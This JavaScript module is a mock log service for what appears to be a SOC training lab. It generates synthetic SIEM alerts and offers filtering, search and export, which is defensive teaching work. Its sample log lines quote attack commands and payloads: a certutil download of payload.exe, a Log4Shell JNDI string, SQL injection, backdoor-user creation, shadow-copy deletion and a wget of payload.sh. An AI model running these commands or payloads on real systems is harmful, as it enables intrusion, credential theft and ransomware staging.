const delay = (ms = 80) => new Promise(r => setTimeout(r, ms));

const LOG_TEMPLATES = [
  { src:'wazuh',    level:'RULE',  text:'wazuh-manager: Rule fired: 100013 level 15 "LSASS memory access — Mimikatz pattern" agent=win10-victim src_ip=192.168.56.30' },
  { src:'wazuh',    level:'RULE',  text:'wazuh-manager: Rule fired: 100001 level 10 "SSH brute force — 10+ failures in 60s" agent=ubuntu-webserver src_ip=203.0.113.45' },
  { src:'wazuh',    level:'RULE',  text:'wazuh-manager: Rule fired: 100019 level 15 "Log4Shell JNDI payload" agent=ubuntu-webserver src_ip=198.51.100.99' },
  { src:'wazuh',    level:'RULE',  text:'wazuh-manager: Rule fired: 100012 level 15 "Shadow copy deletion — ransomware pre-stage" agent=win10-victim' },
  { src:'sysmon',   level:'WARN',  text:'win10-victim sysmon[1234]: EventID=10 TargetImage=lsass.exe SourceImage=powershell.exe GrantedAccess=0x1FFFFF' },
  { src:'sysmon',   level:'WARN',  text:'win10-victim sysmon[1234]: EventID=1 Image=net.exe CommandLine="net user backdooruser P@ss! /add" User=SYSTEM' },
  { src:'sysmon',   level:'WARN',  text:'win10-victim sysmon[1234]: EventID=1 Image=vssadmin.exe CommandLine="vssadmin.exe delete shadows /all /quiet"' },
  { src:'sysmon',   level:'WARN',  text:'win10-victim sysmon[1234]: EventID=1 Image=certutil.exe CommandLine="certutil.exe -urlcache -split -f http://203.0.113.45/payload.exe"' },
  { src:'suricata', level:'NET',   text:'suricata: [1:9000002:1] SOC-LAB SSH Brute Force [Priority:1] TCP 203.0.113.45:54321 -> 192.168.56.40:22' },
  { src:'suricata', level:'NET',   text:'suricata: [1:9000001:1] SOC-LAB Nmap SYN Scan [Priority:2] TCP 192.168.56.20:* -> 192.168.56.0/24:*' },
  { src:'apache',   level:'ERROR', text:'ubuntu-webserver apache2[5678]: 198.51.100.99 - - "GET / HTTP/1.1" 200 - "${jndi:ldap://198.51.100.99:1389/a}"' },
  { src:'apache',   level:'WARN',  text:"ubuntu-webserver apache2[5678]: 203.0.113.45 - - \"GET /admin?q=1' UNION SELECT null-- HTTP/1.1\" 403 -" },
  { src:'sshd',     level:'WARN',  text:'ubuntu-webserver sshd[9012]: Failed password for root from 203.0.113.45 port 54321 ssh2' },
  { src:'sshd',     level:'WARN',  text:'ubuntu-webserver sshd[9012]: Failed password for admin from 203.0.113.45 port 54322 ssh2' },
  { src:'cowrie',   level:'ERROR', text:'siem-server cowrie[1]: Login attempt [root/password] succeeded on :2222 — attacker IP 198.51.100.23' },
  { src:'cowrie',   level:'ERROR', text:'siem-server cowrie[1]: CMD: whoami (honeypot response delivered to 198.51.100.23)' },
  { src:'cowrie',   level:'WARN',  text:'siem-server cowrie[1]: CMD: wget http://198.51.100.23/payload.sh (blocked, honeypot)' },
  { src:'thehive',  level:'RULE',  text:'auto_investigate: TheHive case CASE-2024-0047 created — P1 Critical — LSASS memory access' },
  { src:'thehive',  level:'RULE',  text:'block_ip: iptables DROP added for 203.0.113.45 — result: success' },
  { src:'thehive',  level:'RULE',  text:'block_ip: pfSense WAN block created for 203.0.113.45 — result: success' },
  { src:'auth',     level:'INFO',  text:'siem-server pam_unix[1234]: sshd session opened for user analyst-chen (uid=1001)' },
  { src:'wazuh',    level:'INFO',  text:'wazuh-manager: Agent 001 (win10-victim) connected — version 4.7.4' },
  { src:'wazuh',    level:'INFO',  text:'wazuh-manager: Agent 002 (ubuntu-webserver) connected — version 4.7.4' },
  { src:'suricata', level:'INFO',  text:'suricata: Stats — flows:1234 bytes:8492034 alerts:47 drops:0 uptime:86400s' },
];

let logId = 1;
let buffer = LOG_TEMPLATES.map(t => ({
  id:    logId++,
  src:   t.src,
  level: t.level,
  text:  t.text,
  ts:    new Date(Date.now() - Math.random() * 3600000).toISOString().slice(11,19),
}));

export const logService = {

  async getLogs({ src, level, search, limit=100, sinceId } = {}) {
    await delay();
    let results = [...buffer];
    if (src    && src   !== 'all') results = results.filter(l => l.src   === src);
    if (level  && level !== 'all') results = results.filter(l => l.level === level);
    if (sinceId) {
      const idx = results.findIndex(l => l.id === sinceId);
      if (idx >= 0) results = results.slice(idx+1);
    }
    if (search) {
      const q = search.toLowerCase();
      results = results.filter(l => l.text.toLowerCase().includes(q));
    }
    return results.slice(-limit);
  },

  async getLatest(count = 20) {
    await delay();
    return buffer.slice(-count);
  },

  async ingest(src, text, level) {
    await delay(20);
    if (!src || !text) throw new Error('src and text are required');

    const levelDetect = (t) => {
      const l = t.toLowerCase();
      if (l.includes('critical') || l.includes('error'))  return 'ERROR';
      if (l.includes('warn') || l.includes('fail'))       return 'WARN';
      if (l.includes('rule') || l.includes('alert'))      return 'RULE';
      if (l.includes('net')  || l.includes('suricata'))   return 'NET';
      return 'INFO';
    };

    const entry = {
      id:    logId++,
      src,
      level: level || levelDetect(text),
      text,
      ts:    new Date().toISOString().slice(11,19),
    };
    buffer = [...buffer, entry].slice(-5000);
    return entry;
  },

  async generateSynthetic() {
    await delay(20);
    const template = LOG_TEMPLATES[Math.floor(Math.random() * LOG_TEMPLATES.length)];
    return this.ingest(
      template.src,
      template.text.replace(/T\d{2}:\d{2}:\d{2}Z/, `T${new Date().toISOString().slice(11,19)}Z`),
      template.level
    );
  },

  async getSourceStats() {
    await delay();
    const counts = {};
    buffer.forEach(l => { counts[l.src] = (counts[l.src]||0)+1; });
    return Object.entries(counts).map(([src, count]) => ({ src, count }));
  },

  async getLevelStats() {
    await delay();
    const counts = {};
    buffer.forEach(l => { counts[l.level] = (counts[l.level]||0)+1; });
    return counts;
  },

  async search(query, { src, limit=50 } = {}) {
    await delay();
    if (!query?.trim()) throw new Error('Query required');
    const q = query.toLowerCase();
    let results = buffer.filter(l => l.text.toLowerCase().includes(q));
    if (src && src !== 'all') results = results.filter(l => l.src === src);
    return results.slice(-limit);
  },

  async export({ src, level, search, format='txt' } = {}) {
    await delay();
    const logs = await this.getLogs({ src, level, search, limit:10000 });
    if (format === 'json') return JSON.stringify(logs, null, 2);
    return logs.map(l => `[${l.ts}] [${l.src}] [${l.level}] ${l.text}`).join('\n');
  },

  async clear() {
    await delay(50);
    const count = buffer.length;
    buffer = [];
    return { cleared: count };
  },

  async getBufferInfo() {
    await delay(30);
    return {
      size:       buffer.length,
      maxSize:    5000,
      sources:    [...new Set(buffer.map(l => l.src))],
      oldest:     buffer[0]?.ts      || null,
      newest:     buffer[buffer.length-1]?.ts || null,
    };
  },
};